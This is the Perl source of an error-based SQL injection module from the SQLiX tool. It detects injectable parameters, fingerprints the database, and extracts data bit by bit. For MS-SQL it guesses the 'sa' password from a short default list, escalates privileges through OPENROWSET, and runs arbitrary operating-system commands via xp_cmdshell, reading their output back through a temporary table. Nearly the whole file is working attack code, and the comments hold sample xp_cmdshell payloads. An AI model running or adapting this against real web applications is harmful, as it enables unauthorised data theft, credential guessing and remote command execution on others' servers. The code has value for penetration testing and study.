#!/usr/bin/perl
#

# -- SQLiX --
#
# © Copyright 2006 Cedric COCHIN, All Rights Reserved.
#

#
# -- Generic SQL Server error messages parsing module --
#
#  Looks for specific error messages
#

use LWP::UserAgent;
use URI::Escape;
use strict;

# Global variables
sub check_error_MSSQL;
sub check_error_MSSQL_helper_inject;
sub print_debug;
sub error_tryout($);
sub ident_error;
sub error_exploit(%params, $Key, $function, $verbose, $b_dico);

# MS-SQL
sub error_MSSQL_execute_cmd (%params, $Key, $cmd,$option_login,$option_password);
sub error_MSSQL_OPENROWSET (%params, $Key);
sub error_MSSQL_OPENQUERY (%params, $Key);

##-------------------------------------------------------------------------------------------------
# Function check_error_message
#
# Parses the page for SQL error messages
##-------------------------------------------------------------------------------------------------

sub check_error_message {
	my ($TARGET, $NULL, $X,$b_ident,$b_exploit,$b_union,$function,$cmd, $option_login, $option_password) = @_;
	
	my $method="";
	my $DB ="";
	
	my $FOUND=0;
	
	# reset entries, would be an issue for multithread
	foreach my $message (@MESSAGES) {	
		%{$message}->{FOUND}=0;
	}
	
	my $URL		=	$TARGET->{URL};
	my $HTTP_METHOD	=	$TARGET->{HTTP_METHOD};
	my $CONTENT	=	$TARGET->{CONTENT};
	my $REFERER	=	$TARGET->{REFERER};
	my $AGENT	=	$TARGET->{AGENT};
	my $COOKIE	=	$TARGET->{COOKIE};
	
	my %params;
	$params{URL}		=	$URL;
	$params{HTTP_METHOD}	=	$HTTP_METHOD;
	$params{CONTENT}	=	$CONTENT;
	$params{REFERER} 	= 	$REFERER;
	$params{AGENT}	= 	$AGENT;
	$params{COOKIE}	= 	$COOKIE;
	
	$params{FUNCTION}=$function;
	
	## last option is based on cases where the web applicative layer splits the variable
	## http://example.com/target.php?id=EN105
	## EN105 could be splitted into EN and 115, here the position of the quote could have an impact
	
	my @INPUTS = ("user", "'", "%27", "%2527", '"', "%22", substr($X,0,length($X)-1)."'");
	
	my $ua = LWP::UserAgent->new();
	
	##---------------------------------------------------------------------------------
	## Validate the reference (using X)
	##---------------------------------------------------------------------------------
	
	my $data_url = $URL;
	#$data_url =~ s/--INJECT_HERE--/$X/;
	
	my $data_content = $CONTENT;
	#$data_content =~ s/--INJECT_HERE--/$X/;
	
	my $res;
	
	#$res = fetch($data_url, $HTTP_METHOD, $data_content); 
	
	$res = fetch_inject($TARGET, $X);

	foreach my $message (@MESSAGES) {	
		if(rindex($res->content, %{$message}->{match})!= -1) {
			print_debug("Match found in reference($X) - ".%{$message}->{match},'WARNING',3);
			#discard the message
			%{$message}->{FOUND}=-1;
		}
	}
	
	##---------------------------------------------------------------------------------
	## Validate the reference (using NULL)
	## Open question ==> 	if a NULL value generate a page containing an error message
	## 			is it a vuln or a source of false positive ?
	##			I will consider it as a vuln for now. 
	##---------------------------------------------------------------------------------
	
	$data_url = $URL;
	$data_url =~ s/--INJECT_HERE--//;
	
	$data_content = $CONTENT;
	$data_content =~ s/--INJECT_HERE--//;
	
	#$res = fetch($data_url, $HTTP_METHOD, $data_content);

	$res = fetch_inject($TARGET, '');

	foreach my $message (@MESSAGES) {
		if(%{$message}->{FOUND}==-1) {next;}	
		if(rindex($res->content, %{$message}->{match})!= -1) {
			print_debug("Match found in reference(NULL) - ".%{$message}->{match},'WARNING',3);
			%{$message}->{FOUND}=1;
			$method = "Error message (NULL)";
			foreach my $entry (@{%{$message}->{DB}}) {
				if($DB eq "") {$DB=$entry}
				else {$DB = "$DB/".$entry;}	
			};
			$params{ERROR_MESSAGE}=%{$message}->{match};
			$FOUND=1;last;
		}
	}
	
	##---------------------------------------------------------------------------------
	## Inject INPUTS
	##---------------------------------------------------------------------------------
	
	if(!$FOUND) {
		foreach my $input (@INPUTS) {
			$data_url = $URL;
			$data_url =~ s/--INJECT_HERE--/$input/;
			$data_content = $CONTENT;
			$data_content =~ s/--INJECT_HERE--/$input/;
			
			#$res = fetch($data_url, $HTTP_METHOD, $data_content);
			
			$res = fetch_inject($TARGET, $input);
			
			foreach my $message (@MESSAGES) {	
				if(%{$message}->{FOUND}==-1) {next;}
				if(rindex($res->content, %{$message}->{match})!= -1) {
					print_debug("Match found INPUT:[$input] - \"".%{$message}->{match}."\"",'FOUND',3);
					%{$message}->{FOUND}=1;
					$method = "Error message ($input)";

					foreach my $entry (@{%{$message}->{DB}}) {
						if($DB eq "") {$DB=$entry}
						else {$DB = "$DB/".$entry;}	
					};
					
					$params{ERROR_MESSAGE}=%{$message}->{match};
					$FOUND=1;last;
				}
			}
		if($FOUND) {last;}
		}
	}
	
	if($FOUND && $b_ident) {
		my $Key = ident_error(\%params);
		if($Key ne "") {
			$DB = $Key;
		}
	}
	
	if ($FOUND && $b_exploit && $DB ne "") {
		error_exploit(\%params,$DB,$function,2,1);
	}
	
	if ($FOUND && $cmd && $DB eq "MSSQL") {
		error_MSSQL_execute_cmd(\%params,$DB,$cmd,$option_login,$option_password);
	}
	
	return ($FOUND,$DB,$method);
}

sub ident_error() {
	my ($params) = @_;

	my $res;
	
	my $FOUND =0;
	my $PATTERN = "";
	my $Key ="";
	
	##my $input = uri_escape("'+convert(int,substring(char(49)+char(65),2,1))+'");
	# The fumzy() function ...
	$params->{INJECT} = uri_escape("Fumzy()");
	
	if(error_tryout( $params )) {
		# Error without quote or cast issue with quote for DBs except MySQL
		$params->{INJECT} = uri_escape("abs(1)");
		if(error_tryout( $params )) {
			# Cast issue with quotes
			print_debug("Error with quote and cast",'INFO',3);
			$FOUND = 1; 
			$params->{PATTERN} = "1'+%s+'";
			$params->{METHOD} = 2;
		} else {
			print_debug("Error without quote",'INFO',3);
			$FOUND = 1; 
			$params->{PATTERN} = "%s";
			$params->{METHOD} = 1;
		}
	} else {
		$params->{INJECT} = uri_escape("1'+Fumzy()+'");
		
			if(error_tryout( $params )) {
			print_debug("Error with quote",'INFO',3);
			$FOUND = 1; 
			$params->{PATTERN} = "1'+%s+'";
			$params->{METHOD} = 2;
		}	
	}
	
	## Identitfication
	if($FOUND) {
		foreach my $DB (keys(%DATABASE)) {
			$params->{INJECT} = uri_escape(sprintf($params->{PATTERN}, $DATABASE{$DB}->{v_DETECTION}));
			
			if(!error_tryout( $params )) {
				$Key = $DATABASE{$DB}->{NAME};
				print_debug("Database identified: " . $DATABASE{$DB}->{DESC},'INFO',3);
			}
		}	
	}
	
	return $Key;
}

	
sub error_exploit(%params, $Key, $function, $verbose, $b_dico) {
	my ($params, $Key, $function, $verbose, $b_dico) = @_;
	
	my $method = $params->{METHOD};
	
	if($function eq "") {
		$params->{FUNCTION} = $DATABASE{$Key}->{version};
	} else {
		$params->{FUNCTION} = $function;
	}
	
	print_debug("Current function: $params->{FUNCTION}",'INFO',3) if $verbose==2;
	
	my $PATTERN = sprintf($params->{PATTERN},$DATABASE{$Key}->{v_INJECT_ERROR});
	my $PATTERN_FALSE = sprintf($params->{PATTERN},$DATABASE{$Key}->{v_INJECT_ERROR_FALSE});
	
	## --------------------------------------------------------------------------------------------
	## LENGTH
	## --------------------------------------------------------------------------------------------
	
	$params->{INJECT} = uri_escape(sprintf($PATTERN,$DATABASE{$Key}->{v_INJECT_LENGTH}));
	
	my $length="";
	my $function_value="";
	my $function_display_value="";
	my $result = -1;
	my $tmp;
	
	for (my $i=1; $i<=8;$i++) {
		$params->{POS_BIN} = 8-$i;
		$result = error_tryout( $params );
		$length=$length."$result";
		}

	my $length_dec = ord(pack('B8', $length));
	print_debug ("length: $length_dec",'INFO',3) if $verbose==2;
	
	if($length_dec==0 || $length_dec==255) {
		print_debug("\n",'INTERACTIVE',4) if $verbose>=1;
		return 0;	
	}
	
	## --------------------------------------------------------------------------------------------
	## VALUE
	## --------------------------------------------------------------------------------------------
				
	print_debug("value: ",'DEBUG',3);
	
	## --------------------------------------------------------------------------------------------
	# Dictionary based
	
	$function_value = "_"x$length_dec;
	tie my @function_array, 'Tie::CharArray', $function_value;
	my @function_char_found = ();
	
	$params->{OFFSET} = 1;
	my $BACKUP_FUNCTION = $params->{FUNCTION};
	
	if($b_dico) {
		$params->{FUNCTION} = $DATABASE{$Key}->{test_function};
		$params->{WORD} = $DATABASE{$Key}->{test_pattern};
		
		$params->{INJECT} = uri_escape(sprintf($PATTERN,$DATABASE{$Key}->{v_INJECT_WORD}));
			
		if(error_tryout( $params)) { # We test the global behavior with something we know to be true to not produce false positive
			foreach my $word (@{$DATABASE{$Key}->{DICO}}) {
				my $previous_ref = 0;
				my $loop=1;
				
				$params->{OFFSET} = 1;
				$params->{INJECT} = uri_escape(sprintf($PATTERN_FALSE,$DATABASE{$Key}->{v_INJECT_WORD}));
				
				if($Key eq 'Oracle' || $Key eq 'PostgreSQL') {
					if($method%2) {
						(my $word_hex = $word) =~ s/(.|\n)/sprintf("chr(%d)||", ord $1)/eg; #generate a long URL but no quote
						$params->{WORD} = substr($word_hex,0,length($word_hex)-2);
					} else {
						$params->{WORD} = "'$word'"; #quotes but short
					}
				} else {
					(my $word_hex = $word) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;	
					#if($Key eq 'PostgreSQL') {
					#	$word_hex =~ s/([a-z])/sprintf("||chr(%d)||", ord $1)/eg;
					#	if(substr($word_hex,length($word_hex)-2,2) eq "||") {$word_hex = substr($word_hex,0,length($word_hex)-2);}
					#}	
					$params->{WORD} = $word_hex;
				}
				
				$params->{FUNCTION} = $BACKUP_FUNCTION;
				
				while(!(error_tryout( $params ))) {
					$params->{INJECT} = uri_escape(sprintf($PATTERN,$DATABASE{$Key}->{v_INJECT_WORD_POS}));
					
					my $position = "";
					for (my $i=1; $i<=8;$i++) {
						$params->{POS_BIN} = 8-$i;
						$result = error_tryout( $params );
						$position=$position."$result";
					}
					
					my $position_dec = ord(pack('B8', $position));
					if($position == 0) {last;}
					$position_dec = $position_dec+$previous_ref-1;	# position is perl based (start at 0)	
					
					for(my $k=0;$k<length($word);$k++) {
						$function_array[$position_dec+$k]=substr($word,$k,1);
						$function_char_found[$position_dec+$k]=1;
					}
					$function_display_value=$function_value;
					print_debug("$function_display_value",'INTERACTIVE',4)  if $verbose>=1;
					
					if($Key eq 'MSSQL') {
						#$previous_ref = $previous_ref+$position_dec+length($word);
						$previous_ref = $position_dec+1+length($word);
						$params->{FUNCTION} = $BACKUP_FUNCTION;
						$params->{FUNCTION} = uri_escape("substring(".$params->{FUNCTION}.",".($previous_ref+1).",".($length_dec-$previous_ref).")");
					} 
					if($Key eq 'PostgreSQL') {
						#$previous_ref = $previous_ref+$position_dec+length($word);
						$previous_ref = $position_dec+1+length($word);
						$params->{FUNCTION} = $BACKUP_FUNCTION;
						$params->{FUNCTION} = uri_escape("substring(".$params->{FUNCTION}." from ".($previous_ref+1)." for ".($length_dec-$previous_ref).")");
					} 
					if($Key eq 'Oracle') {
						$params->{OFFSET}++;
					}
					if($Key eq 'MySQL') {
						$params->{OFFSET}=$position_dec+length($word);
					}
					
					$params->{INJECT} = uri_escape(sprintf($PATTERN_FALSE,$DATABASE{$Key}->{v_INJECT_WORD}));
				}
			}
		}
	}
	
	## --------------------------------------------------------------------------------------------
	## Character based 
	
	$params->{FUNCTION} = $BACKUP_FUNCTION;
	
	$params->{INJECT} = uri_escape(sprintf($PATTERN,$DATABASE{$Key}->{v_INJECT_CHAR}));

	my $newline =0;
						
	for (my $j=1; $j<=$length_dec; $j++) {
		if($function_char_found[$j-1]!=1) {
			$tmp="";
			$params->{POS_CHAR} = $j;
			for (my $i=1; $i<=8;$i++) {
				$params->{POS_BIN} = 8-$i;
				$result = error_tryout( $params );
				$tmp=$tmp."$result";
			}
			my $decimal = ord(pack('B8', $tmp));
			$function_array[$j-1]=chr($decimal);
			if($decimal==10) {
				print_debug(substr($function_value,$newline,$j-1-$newline)." "x($length_dec-$j+1)."\n",'INTERACTIVE',4)  if $verbose>=1;
				$newline=$j;
			} else {
				$function_display_value=substr($function_value,$newline,$length_dec-$newline);
				print_debug("$function_display_value",'INTERACTIVE',4) if $verbose>=1;
			}
		}
	}
	print_debug("\n",'INTERACTIVE',4) if $verbose>=1;
	
	return $function_value;
}

##-------------------------------------------------------------------------------------------------
# Function tryout
#
# This will send a http request to the target trying to inject whatever code is given in parameter
##-------------------------------------------------------------------------------------------------

sub error_tryout($) {
	my $params = $_[0];
	my $req;
	my $result = 0;

	my $INJECT = $params->{INJECT};
	
	$INJECT =~ s/--FUNCTION--/$params->{FUNCTION}/g;
	$INJECT =~ s/--POS_BIN--/$params->{POS_BIN}/g;
	$INJECT =~ s/--POS_CHAR--/$params->{POS_CHAR}/g;
	$INJECT =~ s/--WORD--/$params->{WORD}/g;
	$INJECT =~ s/--OFFSET--/$params->{OFFSET}/g;
	
	my $UE_INJECT =  uri_unescape($INJECT);
	
	my $URL = $params->{URL};
	$URL =~ s/--INJECT_HERE--/$INJECT/g;
	
	my $CONTENT = $params->{CONTENT};
	$CONTENT =~ s/--INJECT_HERE--/$INJECT/;
	
	my $REFERER = "";
	
	if($params->{REFERER}) {
		$REFERER= $params->{REFERER};
		$REFERER =~ s/--INJECT_HERE--/$UE_INJECT/;
	}
	
	my $AGENT = "";
	
	if($params->{AGENT}) {
		$AGENT= $params->{AGENT};
		$AGENT =~ s/--INJECT_HERE--/$UE_INJECT/;
	}
	
	my %COOKIE = ();
	
	if($params->{COOKIE}) {
		%COOKIE->{NAME}=$params->{COOKIE}->{NAME};
		%COOKIE->{VALUE}=$params->{COOKIE}->{VALUE};
		%COOKIE->{DOMAIN}=$params->{COOKIE}->{DOMAIN};
		%COOKIE->{VALUE} =~ s/--INJECT_HERE--/$INJECT/;
	}
	
	#my $ua = LWP::UserAgent->new();
	my $res;
	
	$res = fetch($URL, $params->{HTTP_METHOD}, $CONTENT,$REFERER,$AGENT,\%COOKIE);  
	
	if(rindex($res->content, $params->{ERROR_MESSAGE})!= -1) {
		$result=1;		
	} 
	
	if(!$result) {
		foreach my $message (@MESSAGES) {
			if(%{$message}->{FOUND}==-1) {next;}		
			if(rindex($res->content, %{$message}->{match})!= -1) {
				##print_debug("A different error message has been found",'WARNING',3);			
				$result=1;		
			}
		}
	}
			
	return $result;
}

##-------------------------------------------------------------------------------------------------
# MS-SQL Advanced command injection functions
#
##-------------------------------------------------------------------------------------------------

sub error_MSSQL_execute_cmd (%params,$Key,$cmd,$option_login,$option_password) {
	my ($params,$Key,$cmd,$option_login,$option_password) = @_;
	
	# If we have a linked server and sa
	# select * from OPENQUERY([HR-INTRANET],'select 1;exec xp_cmdshell ''osql -E -Q "CREATE TABLE TMP_TMP (id int identity(1,1),cmd varchar(8000))"'';')
	# select * from OPENQUERY([HR-INTRANET],'select 1;insert TMP_TMP exec xp_cmdshell ''dir c:\'';')
	# select count(*) from TMP_TMP
	# select 1 where 1=(select cmd from TMP_TMP where id=7)
	# select * from OPENQUERY([HR-INTRANET],'select 1;exec xp_cmdshell ''osql -E -Q "DROP TABLE TMP_TMP"'';')
	
	# If already sa
	# select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select @@version')
	# select * from OPENROWSET('SQLOLEDB','';;,'select @@version') 
	
	#select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;exec xp_cmdshell ''osql -E -Q "CREATE TABLE TMP_TMP (id int identity(1,1),cmd varchar(8000))"'';')
	#select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;insert TMP_TMP exec xp_cmdshell ''dir c:\''')
	#select * from master..TMP_TMP
	#select * from OPENROWSET('MSDASQL','DRIVER={SQL Server};SERVER=;','select 1;exec xp_cmdshell ''osql -E -Q "DROP TABLE TMP_TMP"'';')
	
	my $PATTERN = sprintf($params->{PATTERN},$DATABASE{$Key}->{v_INJECT_ERROR});
	my $PATTERN_FALSE = sprintf($params->{PATTERN},$DATABASE{$Key}->{v_INJECT_ERROR_FALSE});
	
	my $res;
	my $result = 0;
	my $b_sysadmin=0;
	
	my $credentials ="'MSDASQL','DRIVER={SQL Server};SERVER=;'";
	
	print_debug("System command injector:",'INFO',3);
	
	my $DB = error_exploit(\%{$params}, $Key,"db_name()",0,0); 
	print_debug("Current database: $DB",'INFO',3);
	
	if($option_login) {
		print_debug("Using login/password from command line [$option_login / $option_password]",'INFO',3);
		$credentials = "'SQLOLEDB','';'$option_login';'$option_password'";
		$b_sysadmin=1; # assumed based on user input
	} else {
		$params->{INJECT} = uri_escape(sprintf($PATTERN,"IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E))"));
		if(error_tryout( $params )) {
			# We have sysadmin right
			$b_sysadmin=1;
			print_debug("Running with sysadmin role",'INFO',3);
		} else {
			print_debug("We are not sysadmin for now",'INFO',3);
			
			my ($tmp_result,$sudo,$login,$password) = error_MSSQL_OPENROWSET($params,$Key);
			if($tmp_result) {
				if($sudo) {
					$credentials = "'SQLOLEDB','';'$login';'$password'";
					$b_sysadmin=1;
				}
			}
		}	
	}
	
	if($b_sysadmin) {	
		print_debug("\n",'INTERACTIVE',4);
		print_debug("===========================================================================\n\n",'INTERACTIVE',4);
		
		$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENROWSET($credentials,'select 1;exec xp_cmdshell ''osql -E -Q \"CREATE TABLE $DB..TMP_TMP (id int identity(1,1),cmd varchar(8000))\"'';'))"));
		if(error_tryout( $params )) {
			$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENROWSET($credentials,'select 1;insert $DB..TMP_TMP exec xp_cmdshell ''$cmd'''))"));
			if(error_tryout( $params )) {
				my $nb_lines = int(error_exploit(\%{$params}, $Key,uri_escape("(select convert(varchar,count(*)) from $DB..TMP_TMP)"),0,0));
				
				for(my $i=1;$i<=$nb_lines;$i++) {
					error_exploit(\%{$params}, $Key,uri_escape("(select cmd from $DB..TMP_TMP where id=$i)"),1,0);
				}
		
				print_debug("\n",'INTERACTIVE',4);
				print_debug("===========================================================================\n\n",'INTERACTIVE',4);
			}
			
			$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENROWSET($credentials,'select 1;exec xp_cmdshell ''osql -E -Q \"DROP TABLE $DB..TMP_TMP\"'';'))"));
			error_tryout( $params )
		}
	}
}

sub error_MSSQL_OPENQUERY (%params, $Key) {
	my ($params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE) = @_;
	
	my $result = 0;
	my $PATTERN = sprintf($params->{PATTERN},$DATABASE{$Key}->{v_INJECT_ERROR});
	my $PATTERN_FALSE = sprintf($params->{PATTERN},$DATABASE{$Key}->{v_INJECT_ERROR_FALSE});
	
	print_debug("Checking OpenQuery availibility - please wait...",'INFO',3);
	
	# get @@servername
	my $servername = error_exploit(\%{$params}, $Key, "\@\@servername",0,0); 
	# get host_name()
	my $hostname =  error_exploit(\%{$params}, $Key, "host_name()",0,0); 
	
	print_debug("host_name() = [$hostname]  - \@\@servername = [$servername]",'INFO',4);
	
	if(!$result) {
		$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENQUERY([$servername],'select 1'))"));
		if(tryout( $params )) {
			print_debug("OPENQUERY available - linked server [$servername]",'FOUND',4);
			$result = 1;
		} 
	}	
	
	if(!$result) {
		$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENQUERY([$hostname],'select 1'))"));
		if(tryout( $params )) {
			print_debug("OPENQUERY available - linked server [$hostname]",'FOUND',4);
			$result = 1;
		} 
	}
	
	# if agressive mode and no result
	#sp_addlinkedserver @server = 'LOCALSERVER',  @srvproduct = '',@provider = 'SQLOLEDB', @datasrc = @@servername
	# MSDASQL
	# 'SET FMTONLY OFF' see http://www.sommarskog.se/share_data.html
	
	return $result;
	
}

sub error_MSSQL_OPENROWSET (%params, $Key) {
	my ($params, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE) = @_;
	
	my $result = 0;
	my $login ="";
	my $password = "";
	my $sudo =0;
	
	my $PATTERN = sprintf($params->{PATTERN},$DATABASE{$Key}->{v_INJECT_ERROR});
	my $PATTERN_FALSE = sprintf($params->{PATTERN},$DATABASE{$Key}->{v_INJECT_ERROR_FALSE});
	
	my @passwords = ('','sa','pass','password');
	
	print_debug("Checking OpenRowSet availibility - please wait...",'INFO',3);
	
	# get system_user
	my $user = error_exploit(\%{$params}, $method, $Key, $vector,$PATTERN,$PATTERN_FALSE,"system_user",0); 
	print_debug("Current user login: [$user]",'INFO',4);
	
	foreach my $pass (@passwords) {
		$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENROWSET('SQLOLEDB','';'sa';'$pass','select 1'))"));
		if(tryout( $params )) {
			print_debug("OPENROWSET available - (login [sa] | password [$pass])",'FOUND',4);
			if($user ne "sa") {print_debug("Privilege escalation - from [$user] to [sa]",'INFO',4);}
			$login = "sa"; $password=$pass;$sudo=1;
			$result = 1;
			last;
		}
	}
	
	if(!$result && ($user ne "sa")) {
		push(@passwords,$user);
		foreach my $pass (@passwords) {
			$params->{INJECT} = uri_escape(sprintf($PATTERN,"(select 1 from OPENROWSET('SQLOLEDB','';'$user';'$pass','select 1'))"));
			if(tryout( $params )) {
				print_debug("OPENROWSET available - (login [$user] | password [$pass])",'FOUND',4);
				$params->{INJECT} = uri_escape(sprintf($PATTERN,"IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E))"));
				if(tryout( $params )) {
					print_debug("Login [$user] has 'sysadmin' role",'INFO',4);
				}
				$login = $user; $password=$pass;
				$result = 1;
				last;
			}
		}
	}
	
	return ($result,$sudo,$login,$password);
}

return 1;